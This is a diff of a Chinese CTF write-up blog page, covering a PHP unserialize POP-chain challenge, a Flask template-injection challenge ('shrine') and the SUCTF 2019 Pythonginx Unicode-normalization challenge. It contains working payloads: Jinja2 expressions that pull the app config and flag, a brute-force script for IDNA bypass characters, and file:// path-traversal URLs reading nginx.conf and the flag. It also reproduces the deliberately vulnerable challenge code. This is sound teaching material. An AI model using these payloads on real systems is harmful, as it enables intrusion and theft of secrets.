class="line">    &#125; &#x2F;&#x2F;对象本身是不能够当做函数去使用的，一旦被当做函数使用，就会回调执行__invoke()方法</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file&#x3D;&#39;index.php&#39;)&#123;</span><br><span class="line">        $this-&gt;source &#x3D; $file;</span><br><span class="line">        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;&#x2F;gopher|http|file|ftp|https|dict|\.\.&#x2F;i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source &#x3D; &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p &#x3D; array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function &#x3D; $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;pop&#39;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#39;pop&#39;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a&#x3D;new Show;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
       
     </div>
 
@@ -713,145 +890,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/15/shrine1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="六公子买单">
-      <meta itemprop="description" content="一头努力的菜鸟">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Daq1ang">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/03/15/shrine1/" class="post-title-link" itemprop="url">shrine1</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2021-03-15 21:15:07 / Modified: 21:32:33" itemprop="dateCreated datePublished" datetime="2021-03-15T21:15:07+08:00">2021-03-15</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import flask</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app &#x3D; flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[&#39;FLAG&#39;] &#x3D; os.environ.pop(&#39;FLAG&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">def index():</span><br><span class="line">    return open(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;shrine&#x2F;&lt;path:shrine&gt;&#39;)</span><br><span class="line">def shrine(shrine):</span><br><span class="line"></span><br><span class="line">    def safe_jinja(s):</span><br><span class="line">        s &#x3D; s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)</span><br><span class="line">        blacklist &#x3D; [&#39;config&#39;, &#39;self&#39;]  &#x2F;&#x2F;config和self被关进了小黑屋</span><br><span class="line">        return &#39;&#39;.join([&#39;&#123;&#123;% set &#123;&#125;&#x3D;None%&#125;&#125;&#39;.format(c) for c in blacklist]) + s</span><br><span class="line"></span><br><span class="line">    return flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.run(debug&#x3D;True)</span><br></pre></td></tr></table></figure>
-<p>可以采用url_for去初始化current_app，从而读取config内容。</p>
-<p>所以直接payload:</p>
-<pre><code>&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;</code></pre>
-<p>也可以</p>
-<pre><code>/shrine/&#123;&#123;get_flashed_messages.__globals__['current_app'].config['FLAG']&#125;&#125;</code></pre>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/15/Pythonginx/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="六公子买单">
-      <meta itemprop="description" content="一头努力的菜鸟">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Daq1ang">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/03/15/Pythonginx/" class="post-title-link" itemprop="url">Pythonginx</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2021-03-15 20:31:21 / Modified: 21:13:11" itemprop="dateCreated datePublished" datetime="2021-03-15T20:31:21+08:00">2021-03-15</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="buu-SUCTF-2019-Pythonginx"><a href="#buu-SUCTF-2019-Pythonginx" class="headerlink" title="buu-[SUCTF 2019]Pythonginx"></a>buu-[SUCTF 2019]Pythonginx</h2><p>源码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#39;&#x2F;getUrl&#39;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])</span><br><span class="line">def getUrl():</span><br><span class="line">    url &#x3D; request.args.get(&quot;url&quot;)</span><br><span class="line">    host &#x3D; parse.urlparse(url).hostname</span><br><span class="line">    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:</span><br><span class="line">        return &quot;我扌 your problem? 111&quot;</span><br><span class="line">    parts &#x3D; list(urlsplit(url))</span><br><span class="line">    host &#x3D; parts[1]</span><br><span class="line">    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:</span><br><span class="line">        return &quot;我扌 your problem? 222 &quot; + host</span><br><span class="line">    newhost &#x3D; []</span><br><span class="line">    for h in host.split(&#39;.&#39;):</span><br><span class="line">        newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</span><br><span class="line">    parts[1] &#x3D; &#39;.&#39;.join(newhost)</span><br><span class="line">    #去掉 url 中的空格</span><br><span class="line">    finalUrl &#x3D; urlunsplit(parts).split(&#39; &#39;)[0]</span><br><span class="line">    host &#x3D; parse.urlparse(finalUrl).hostname</span><br><span class="line">    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:</span><br><span class="line">        return urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    else:</span><br><span class="line">        return &quot;我扌 your problem? 333&quot;</span><br></pre></td></tr></table></figure>
-<p>大佬说：这道题用的是blackhat议题之一HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization，</p>
-<p>这个题的代码说：提交一个url，前两个if不同，第三个相同，host构造方法不同，但要都等于</p>
-<pre><code>suctf.cc</code></pre>
-<p>这也是议题要说明的：当URL 中出现一些特殊字符的时候，输出的结果可能不在预期(选择替换最后一个字符c)</p>
-<p>接着我们只需要按照getUrl函数写出爆破脚本即可得到我们能够逃逸的构造语句了</p>
-<p>偷大佬的脚本：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">from urllib.parse import urlparse,urlunsplit,urlsplit</span><br><span class="line">from urllib import parse</span><br><span class="line">def get_unicode():</span><br><span class="line">    for x in range(65536):</span><br><span class="line">        uni&#x3D;chr(x)</span><br><span class="line">        url&#x3D;&quot;http:&#x2F;&#x2F;suctf.c&#123;&#125;&quot;.format(uni)&#x2F;&#x2F;最后一个c</span><br><span class="line">        try:</span><br><span class="line">            if getUrl(url):</span><br><span class="line">                print(&quot;str: &quot;+uni+&#39; unicode: \\u&#39;+str(hex(x))[2:])</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line"> </span><br><span class="line">def getUrl(url):</span><br><span class="line">    url&#x3D;url</span><br><span class="line">    host&#x3D;parse.urlparse(url).hostname</span><br><span class="line">    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:</span><br><span class="line">        return False</span><br><span class="line">    parts&#x3D;list(urlsplit(url))</span><br><span class="line">    host&#x3D;parts[1]</span><br><span class="line">    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:</span><br><span class="line">        return False</span><br><span class="line">    newhost&#x3D;[]</span><br><span class="line">    for h in host.split(&#39;.&#39;):</span><br><span class="line">        newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</span><br><span class="line">    parts[1]&#x3D;&#39;.&#39;.join(newhost)</span><br><span class="line">    finalUrl&#x3D;urlunsplit(parts).split(&#39; &#39;)[0]</span><br><span class="line">    host&#x3D;parse.urlparse(finalUrl).hostname</span><br><span class="line">    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if __name__&#x3D;&#x3D;&#39;__main__&#39;:</span><br><span class="line">    get_unicode()</span><br></pre></td></tr></table></figure>
-<p>运行得</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">str: ℂ unicode: \u2102</span><br><span class="line">str: ℭ unicode: \u212d</span><br><span class="line">str: Ⅽ unicode: \u216d</span><br><span class="line">str: ⅽ unicode: \u217d</span><br><span class="line">str: Ⓒ unicode: \u24b8</span><br><span class="line">str: ⓒ unicode: \u24d2</span><br><span class="line">str: Ｃ unicode: \uff23</span><br><span class="line">str: ｃ unicode: \uff43</span><br></pre></td></tr></table></figure>
-<p>题目提示nginx，</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">配置文件存放目录：&#x2F;etc&#x2F;nginx</span><br><span class="line">主配置文件：&#x2F;etc&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br><span class="line">管理脚本：&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.service</span><br><span class="line">模块：&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modules</span><br><span class="line">应用程序：&#x2F;usr&#x2F;sbin&#x2F;nginx</span><br><span class="line">程序默认存放位置：&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html</span><br><span class="line">日志默认存放位置：&#x2F;var&#x2F;log&#x2F;nginx</span><br><span class="line">配置文件目录为：&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br></pre></td></tr></table></figure>
-<p>尝试读nginx的配置文件</p>
-<pre><code>?url=file://suctf.c%E2%84%82/../../../../..//usr/local/nginx/conf/nginx.conf</code></pre>
-<p>读到了flag的位置：/usr/fffffflag</p>
-<pre><code>?url=file://suctf.c%E2%84%82/../../../../..//usr/fffffflag</code></pre>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -930,7 +968,7 @@
         <span class="site-state-item-name">categories</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-count">15</span>
         <span class="site-state-item-name">tags</span>
       </div>
   </nav>
